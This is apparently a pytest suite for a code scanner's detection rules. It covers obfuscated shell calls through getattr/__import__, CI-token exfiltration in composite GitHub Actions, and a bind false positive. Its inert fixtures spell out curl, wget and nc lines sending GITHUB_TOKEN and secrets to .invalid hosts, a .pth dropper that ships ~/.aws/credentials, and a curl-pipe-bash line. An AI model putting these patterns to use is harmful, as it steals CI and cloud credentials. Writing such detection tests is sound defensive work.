"""Ruleset 69: the last two detection gaps a blind red-team found (2026-10-10), and a false
positive found by dogfooding.

Gap A — a dangerous callable or a module reached through a name that was bound to a
``getattr`` / ``__import__`` / ``importlib.import_module`` result, then called later in the same
scope (``f = getattr(os, "system"); f(cmd)`` / ``m = __import__("os"); m.system(cmd)``). The
direct one-expression forms resolved since ruleset 65; the two-statement form did not.

Gap B — a composite GitHub Action ``run:`` step that sends a CI token (``GITHUB_TOKEN``,
``ACTIONS_RUNTIME_TOKEN``, ``ACTIONS_ID_TOKEN_REQUEST_TOKEN``, ``${{ secrets.* }}``,
``${{ github.token }}``) to a non-GitHub host through a network client — credential exfiltration
on the runner of whoever uses the action.

Gap C — ``ST-EXPOSE-BIND`` read an all-interfaces address inside a warning or log message
(``f"WARNING: binding {host or '0.0.0.0'} ..."``) as a bind. An address inside a format or
template string whose constant text contains whitespace is prose; a bind string never is.

Each item is pinned by a sample that fails on ruleset 68 and by the near-misses that must stay
as they were. Sanitized fixtures only: hosts are ``.invalid``, commands are inert, nothing is
executed.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component, ThreatClass


def _report(root: Path):
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


_BUDGET_S = 2.0


def _timed(call) -> None:
    # CPU time, not wall time: under parallel test workers the wall clock counts the others too.
    start = time.process_time()
    call()
    took = time.process_time() - start
    assert took < _BUDGET_S, f"took {took:.1f}s"


def _one_file(tmp_path: Path, name: str, text: str):
    from skilltotal.file_index import FileIndex

    (tmp_path / name).write_text(text, encoding="utf-8")
    index = FileIndex.build(tmp_path)
    assert index.files, f"{name} was not indexed"
    return index


# =====================================================================================
# Gap A — a dangerous call reached through a name bound to getattr / __import__
# =====================================================================================

@pytest.mark.parametrize(
    "src",
    [
        # module bound by __import__, then an attribute call on it
        'm = __import__("os")\nm.system("id")\n',
        # module bound by importlib.import_module
        'import importlib\nm = importlib.import_module("os")\nm.system("id")\n',
        # callable bound by getattr(<module>, <literal>)
        'import os\nf = getattr(os, "system")\nf("id")\n',
        # getattr with a name spelled out by concatenation
        'import os\nf = getattr(os, "sys" + "tem")\nf("id")\n',
        # the red-team fixture's exact shape: module by __import__, name by getattr, both folded
        'm = __import__("o" + "s")\nf = getattr(m, "sys" + "tem")\nf("id")\n',
        # the subprocess family through a bound getattr
        'import subprocess\nr = getattr(subprocess, "run")\nr(["id"])\n',
        'm = __import__("subprocess")\nm.Popen(["id"])\n',
        # the exec*/spawn* process family through a bound getattr
        'import os\ne = getattr(os, "execvp")\ne("sh", ["sh"])\n',
    ],
)
def test_a_shell_call_through_a_bound_name_is_shell(tmp_path: Path, src: str):
    assert "ST-SHELL-PY" in _ids(_write(tmp_path, {"m.py": src}))


@pytest.mark.parametrize(
    "src",
    [
        'import builtins\ng = getattr(builtins, "ex" + "ec")\ng(code)\n',
        'm = __import__("builtins")\nm.eval(code)\n',
    ],
)
def test_dynamic_exec_through_a_bound_name_is_dynamic_code(tmp_path: Path, src: str):
    assert "ST-DYN-PY" in _ids(_write(tmp_path, {"m.py": src}))


def test_a_dynamic_command_through_a_bound_shell_name_is_command_injection(tmp_path: Path):
    src = 'import os\nf = getattr(os, "system")\nf(payload)\n'
    ids = _ids(_write(tmp_path, {"m.py": src}))
    assert "ST-SHELL-PY" in ids
    assert "ST-CMDI-PY" in ids


_EXEC_IDS = {
    "ST-SHELL-PY", "ST-CMDI-PY", "ST-DYN-PY", "ST-TAINT-SHELL-PY", "ST-TAINT-EXEC-PY",
}


@pytest.mark.parametrize(
    "bound, direct",
    [
        # an untrusted value into a bound shell call: the taint finding, as for the direct call
        (
            'import os\nf = getattr(os, "system")\nf(os.environ["CMD"])\n',
            'import os\nos.system(os.environ["CMD"])\n',
        ),
        # the same inside a function, with the module bound by __import__
        (
            'import os\ndef run():\n    m = __import__("os")\n    m.popen(os.getenv("CMD"))\n',
            'import os\ndef run():\n    os.popen(os.getenv("CMD"))\n',
        ),
        # untrusted input into exec reached through the builtins module
        (
            'import builtins\nx = getattr(builtins, "exec")\nx(input())\n',
            "exec(input())\n",
        ),
        # a constant argv list: process creation only, no injection
        (
            'import subprocess\nr = getattr(subprocess, "run")\nr(["git", "status"])\n',
            'import subprocess\nsubprocess.run(["git", "status"])\n',
        ),
    ],
)
def test_a_bound_name_gets_the_same_rule_ids_as_the_direct_call(
    tmp_path: Path, bound: str, direct: str
):
    got = _ids(_write(tmp_path / "bound", {"m.py": bound})) & _EXEC_IDS
    want = _ids(_write(tmp_path / "direct", {"m.py": direct})) & _EXEC_IDS
    assert want, "the direct form must fire"
    assert got == want


@pytest.mark.parametrize(
    "name, src",
    [
        # reassigned in the same scope -> which value it holds at the call is ambiguous
        ("reassigned", 'import os\nf = getattr(os, "system")\nf = print\nf("id")\n'),
        # getattr on an object that is not a module -> its attribute could be anything
        (
            "object_attr",
            "class R:\n    def system(self, c):\n        return c\n"
            'r = R()\ng = getattr(r, "system")\ng("id")\n',
        ),
        # bound to a non-dangerous module function
        ("safe_module", 'm = __import__("json")\nm.loads("{}")\n'),
        # a non-constant attribute name does not resolve
        ("dynamic_attr", 'import os\nf = getattr(os, name)\nf("id")\n'),
        # a non-constant module name does not resolve
        ("dynamic_module", "pkg = input()\nm = __import__(pkg)\nm.system('id')\n"),
    ],
)
def test_bound_name_near_misses_stay_clean(tmp_path: Path, name: str, src: str):
    assert "ST-SHELL-PY" not in _ids(_write(tmp_path, {f"{name}.py": src}))


def test_a_binding_does_not_leak_into_another_function_scope(tmp_path: Path):
    # `danger` is bound (but never called) in a(); in b() it is a free name with no binding here,
    # so b()'s call must not be read as os.system. If the binding leaked, ST-SHELL-PY would fire.
    src = (
        "import os\n"
        "def a():\n    danger = getattr(os, 'system')\n    return danger\n"
        "def b():\n    danger('id')\n"
    )
    assert "ST-SHELL-PY" not in _ids(_write(tmp_path, {"m.py": src}))


def test_a_pth_dropper_whose_helper_hides_its_shell_call_is_detected(tmp_path: Path):
    # A .pth persistence package: the .pth auto-imports a helper on every interpreter start (a
    # pattern setuptools/coloredlogs/better_exceptions all use legitimately, so the .pth itself is
    # not flagged), and the helper reaches the network through a module bound by __import__ and
    # ships a credential file. The exfiltration is only visible once the bound module resolves.
    pth = 'import os; exec("import _sitecompat")\n'
    helper = (
        "import os\n"
        '_net = __import__("urllib.request")\n'
        '_p = os.path.expanduser("~/.aws/credentials")\n'
        "with open(_p) as fh:\n    _data = fh.read()\n"
        '_net.urlopen("https://drop.invalid/c", _data.encode())\n'
    )
    report = _report(_write(tmp_path, {"persist.pth": pth, "_sitecompat.py": helper}))
    ids = {f.id for f in report.findings}
    assert "ST-NET-PY" in ids, "the network client reached through __import__ must resolve"
    assert "ST-COMBO-EXFIL" in ids, "credential read + egress must form the exfiltration combo"
    assert report.risk_level.value in ("high", "critical")


def test_the_bound_name_pass_is_linear(tmp_path: Path):
    # A long run of harmless single assignments must not make binding resolution super-linear.
    from skilltotal.scanners.python_ast import PythonAstScanner

    body = "".join(f"a{i} = getattr(os, 'path')\n" for i in range(5_000))
    index = _one_file(tmp_path, "big.py", "import os\n" + body + "a0.join('x')\n")
    _timed(lambda: PythonAstScanner().scan(index))


# =====================================================================================
# Gap B — a CI token sent to a non-GitHub host from a composite action run step
# =====================================================================================

_RULE = "ST-ACTION-SECRET-EXFIL"
_HEAD = (
    "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
    "    - shell: bash\n      run: "
)
_PWSH = (
    "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
    "    - shell: pwsh\n      run: "
)


@pytest.mark.parametrize(
    "run",
    [
        'curl -X POST -d "$GITHUB_TOKEN" https://ci-metrics.invalid/c',
        'curl -H "Authorization: Bearer $GITHUB_TOKEN" https://collect.invalid/x',
        'wget --post-data "token=${{ github.token }}" https://collect.invalid/',
        'curl "https://exfil.invalid/?t=${{ secrets.NPM_TOKEN }}"',
        'curl -d "$ACTIONS_RUNTIME_TOKEN" https://collect.invalid/a',
        'curl -d "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" https://collect.invalid/o',
        'nc collect.invalid 443 <<< "$GITHUB_TOKEN"',
    ],
)
def test_a_ci_token_sent_to_a_foreign_host_is_action_secret_exfil(tmp_path: Path, run: str):
    report = _report(_write(tmp_path, {"action.yml": _HEAD + run + "\n"}))
    ids = {f.id for f in report.findings}
    assert _RULE in ids
    f = next(f for f in report.findings if f.id == _RULE)
    assert f.threat_class == ThreatClass.MALICIOUS_INDICATOR
    assert f.evidence[0].file == "action.yml"


def test_a_ci_token_exfil_in_powershell_is_detected(tmp_path: Path):
    run = "Invoke-WebRequest -Uri https://collect.invalid/x -Body $env:GITHUB_TOKEN"
    assert _RULE in _ids(_write(tmp_path, {"action.yml": _PWSH + run + "\n"}))


def test_a_block_scalar_token_exfil_is_detected(tmp_path: Path):
    yml = (
        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
        "    - shell: bash\n      run: |\n"
        "        echo start\n"
        '        curl -sS -d "$GITHUB_TOKEN" https://collect.invalid/c\n'
    )
    assert _RULE in _ids(_write(tmp_path, {"action.yml": yml}))


@pytest.mark.parametrize(
    "run",
    [
        # the token goes to the GitHub API, which is where it belongs
        'curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/o/r/issues',
        # pushing to GitHub with the token in the URL
        "git push https://x-access-token:${{ github.token }}@github.com/o/r HEAD:main",
        # the GitHub CLI, not a generic network client
        'gh api -H "Authorization: token $GITHUB_TOKEN" /repos/o/r/releases',
        # downloading a tool from GitHub releases, no token in the request
        "curl -fsSL -o tool https://github.com/o/tool/releases/download/v1/tool-linux",
        # the token is only masked in the log, never sent
        'echo "::add-mask::$GITHUB_TOKEN"',
        # a network client to a foreign host, but with no secret in that command
        "curl -fsSL https://get.example.invalid/install.sh | bash",
        # the token reaches GitHub infra through its documented URL env var
        'curl -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL/twirp/x"',
    ],
)
def test_action_secret_exfil_near_misses_stay_clean(tmp_path: Path, run: str):
    assert _RULE not in _ids(_write(tmp_path, {"action.yml": _HEAD + run + "\n"}))


def test_a_token_used_by_gh_and_a_curl_elsewhere_stays_clean(tmp_path: Path):
    # The token is handed to gh (legitimate); a separate curl to a foreign host carries no secret.
    yml = (
        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
        "    - shell: bash\n      run: |\n"
        '        gh api -H "Authorization: token $GITHUB_TOKEN" /repos/o/r > meta.json\n'
        "        curl -fsSL https://get.example.invalid/x.sh -o x.sh\n"
    )
    assert _RULE not in _ids(_write(tmp_path, {"action.yml": yml}))


def test_a_multiline_github_api_call_with_the_token_stays_clean(tmp_path: Path):
    # The curl is written across lines with shell line-continuations; the token and the GitHub
    # host must be read as one command, not split into a secret-only segment and a host-only one.
    yml = (
        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
        "    - shell: bash\n      run: |\n"
        '        curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" \\\n'
        '          -d \'{"body":"ok"}\' \\\n'
        '          "https://api.github.com/repos/o/r/issues/1/comments"\n'
    )
    assert _RULE not in _ids(_write(tmp_path, {"action.yml": yml}))


def test_action_secret_exfil_does_not_fire_outside_a_composite_action(tmp_path: Path):
    # A plain shell script with $GITHUB_TOKEN is not a composite action run step; this rule is
    # scoped to action.yml, where the step runs on a consumer's runner.
    sh = '#!/bin/bash\ncurl -d "$GITHUB_TOKEN" https://collect.invalid/c\n'
    assert _RULE not in _ids(_write(tmp_path, {"deploy.sh": sh}))


def test_the_action_secret_exfil_pass_is_linear(tmp_path: Path):
    run = "echo " + "a" * 40000 + ' ; curl -d "$GITHUB_TOKEN" https://collect.invalid/c'
    yml = _HEAD + run + "\n"
    _timed(lambda: _ids(_write(tmp_path, {"action.yml": yml})))


# =====================================================================================
# Gap C — ST-EXPOSE-BIND false positive: an all-interfaces address inside a warning message
# =====================================================================================

_WARNING_FSTRING = (
    "import sys\n"
    "def serve(host, api_key, app, port):\n"
    '    if host in ("0.0.0.0", "::", "") and not api_key:\n'
    "        print(\n"
    "            f\"WARNING: binding {host or '0.0.0.0'} with no api-key exposes the server \"\n"
    '            "unauthenticated on the network.",\n'
    "            file=sys.stderr,\n"
    "        )\n"
    "    uvicorn.run(app, host=host, port=port)\n"
)


def test_an_all_interfaces_address_in_a_warning_message_is_not_a_bind(tmp_path: Path):
    # The only risky construct here was the address literal inside a warning f-string, which is
    # prose (its constant text has spaces), not a bind. Nothing in this file binds a server.
    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"server.py": _WARNING_FSTRING}))


def test_an_all_interfaces_address_in_a_log_message_is_not_a_bind(tmp_path: Path):
    # The same message handed to a logger rather than print(): not a bind either.
    src = (
        "import logging\nlog = logging.getLogger(__name__)\n"
        "def serve(host):\n"
        "    log.warning(f\"refusing to listen on {host or '0.0.0.0'} without a key\")\n"
    )
    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"serve.py": src}))


@pytest.mark.parametrize(
    "name, src",
    [
        # a fallback into the all-interfaces address, assigned and then bound
        (
            "assign_fallback",
            'host = args.host or "0.0.0.0"\nuvicorn.run(app, host=host, port=port)\n',
        ),
        # the fallback directly in the bind call's host keyword
        ("kw_fallback", 'uvicorn.run(app, host=args.host or "0.0.0.0")\n'),
        # a real bind address built with an f-string: host:port, no whitespace in the constants
        ("bind_fstring", "bind = f\"{host or '0.0.0.0'}:{port}\"\n"),
    ],
)
def test_real_all_interfaces_binds_still_flag(tmp_path: Path, name: str, src: str):
    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {f"{name}.py": src}))


def test_a_warning_message_bind_in_a_js_template_is_not_a_bind(tmp_path: Path):
    # A logger call (not console.*, whose arguments were already read as printed text).
    js = "logger.warn(`binding ${host || '0.0.0.0'} with no token leaves it open`);\n"
    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"warn.js": js}))


def test_a_bind_built_with_a_js_template_still_flags(tmp_path: Path):
    js = "const bind = `${host || '0.0.0.0'}:${port}`;\nserver.listen(bind);\n"
    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {"serve.js": js}))


def test_a_real_bind_after_an_unbalanced_code_fence_in_a_comment_still_flags(tmp_path: Path):
    # A markdown fence in a JSDoc block leaves an odd backtick in a comment. Templates come from
    # the lexer, so that backtick cannot open a "template" that runs over the real bind below.
    js = "/** Example: ```js */\nserver.listen(3000, '0.0.0.0');\nconst t = `x`;\n"
    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {"serve.js": js}))


def test_the_warning_message_suppression_pass_is_linear(tmp_path: Path):
    # The added suppression (an address literal inside a prose f-string / JS template) must be
    # linear. Timed on its own, apart from ast.parse, which the engine already pays per .py file.
    import ast

    from skilltotal.scanners.exposure import (
        ExposureScanner,
        _js_prose_template_spans,
        _python_prose_fstring_lines,
    )

    py = "def f(host):\n" + (
        "    log(f\"please do not expose {host or '0.0.0.0'} without a key here now\")\n" * 8_000
    )
    tree = ast.parse(py)
    _timed(lambda: _python_prose_fstring_lines(tree))

    js = "logger.warn(`binding ${host || '0.0.0.0'} with no token leaves it open`);\n" * 8_000
    index = _one_file(tmp_path, "warn.js", js)
    _timed(lambda: _js_prose_template_spans(index.files[0]))
    # ...and the per-match lookup over those spans, through the whole bind pass.
    _timed(lambda: ExposureScanner().scan(index))
